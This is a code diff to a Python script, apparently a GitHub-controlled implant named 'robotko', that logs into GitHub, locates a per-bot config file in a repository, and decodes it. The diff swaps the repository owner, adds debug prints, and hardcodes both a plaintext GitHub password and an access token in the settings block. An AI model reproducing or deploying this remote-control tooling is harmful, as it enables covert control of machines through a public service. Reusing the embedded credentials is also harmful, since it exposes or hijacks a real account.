@@ -5,13 +5,14 @@ from github3 import login
 #### CONFIGURE YOUR SETTINGS HERE ####
 GH_USERNAME = 'unsecur3'
 GH_PASSWORD = 'wNJL4u8#%ZHF'
-OWNER = 'iluxonchik'
+OWNER = 'unsecur3'
 REPOSITORY = 'robotko'
 BRANCH = 'master'
+tokenn = 'd8d65e8a31ab96ccb2dbaf5a1a0a63617fba3b37'
 ######################################
 
 robotko_id = "abc"  # unique id for this robotko
-relative_path = "robotko/"
+relative_path = ""
 robotko_config = relative_path + "config/{0}.json".format(robotko_id)
 data_path = relative_path + "data/{0}/".format(robotko_id)
 robotko_modules = []
@@ -20,7 +21,8 @@ task_queue = Queue()
 
 def connect_to_github():
 	# NOTE: there is also an option to login via tokens (see docs for more info)
-	gh = login(username=GH_USERNAME, password=GH_PASSWORD)
+	# gh = login(username=GH_USERNAME, password=GH_PASSWORD)
+	gh = login(token = tokenn)
 	repo = gh.repository(OWNER, REPOSITORY)
 	branch = repo.branch(BRANCH)
 
@@ -28,9 +30,19 @@ def connect_to_github():
 
 def get_file_contents(filepath):
 	gh, repo, branch = connect_to_github()
-	tree = branch.commit.commit.tree.recurse()
-
+	# old code
+	# tree = branch.commit.commit.tree.recurse()
+	tree = branch.commit.commit.tree.to_tree().recurse()
+	# print(20*'*')
+	# print("gh, repo, branch", gh, repo, branch)
+	# print("filepath - ", filepath)
+	# print(type(tree))
+	# print(dir(tree))
+	# print(tree.tree)
+	# print(tree.url)
+	# print(20*'*')
 	for filename in tree.tree:
+		print(filename.path)
 		if filepath in filename.path:
 			print("[*] Found file {0}".format(filepath))
 			blob = repo.blob(filename._json_data["sha"])
@@ -40,6 +52,7 @@ def get_file_contents(filepath):
 def get_robotko_config():
 	global configured
 	config_json = get_file_contents(robotko_config)
+	print(robotko_config)
 	config = json.loads(base64.b64decode(config_json).decode(encoding="utf-8"))
 	configured = True
 
